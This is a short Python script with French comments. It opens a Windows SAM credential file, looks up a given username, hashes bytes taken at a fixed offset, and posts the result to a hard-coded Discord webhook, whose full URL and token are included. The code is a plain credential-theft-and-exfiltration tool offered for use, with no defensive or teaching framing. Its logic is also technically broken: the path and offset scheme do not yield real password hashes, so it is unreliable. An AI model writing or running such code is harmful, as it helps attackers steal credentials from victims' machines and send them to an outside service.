import os
import requests
import hashlib
from discord_webhook import DiscordWebhook

def retrieve_username_hash(username):
    sam_path = r'C:\SAM'

    with open(sam_path, 'rb') as sam_file:
        sam_data = sam_file.read()

        # Trouve l'entrée du nom d'utilisateur dans le fichier SAM
        user_offset = sam_data.find(username.encode())
        
        # Si le nom d'utilisateur est trouvé
        if user_offset != -1:
            sam_file.seek(user_offset + 52)  # Ajuste ce décalage en fonction de ta configuration
            username_hash = hashlib.sha256(sam_file.read(32)).hexdigest()

            return username_hash
        else:
            return None

def send_to_discord(webhook_url, username, username_hash):
    content = f'Hash du nom d\'utilisateur {username}: {username_hash}'
    webhook = DiscordWebhook(url=webhook_url, content=content)
    webhook.execute()

if __name__ == "__main__":
    # Remplace 'TON_WEBHOOK_URL' par le véritable URL de ton webhook Discord
    webhook_url = 'https://discord.com/api/webhooks/1186985816254316574/pEkFuwOfHZ_cKTFglI8QXZLedEfwaF9FleoiagqpKVTvqxyg7myl3lQu2apzO7sdHp8h'

    # Remplace 'NomUtilisateur' par le nom d'utilisateur désiré
    username_to_retrieve = 'NomUtilisateur'

    username_hash = retrieve_username_hash(username_to_retrieve)

    if username_hash:
        send_to_discord(webhook_url, username_to_retrieve, username_hash)
    else:
        print(f'Nom d\'utilisateur {username_to_retrieve} non trouvé dans le fichier SAM.')
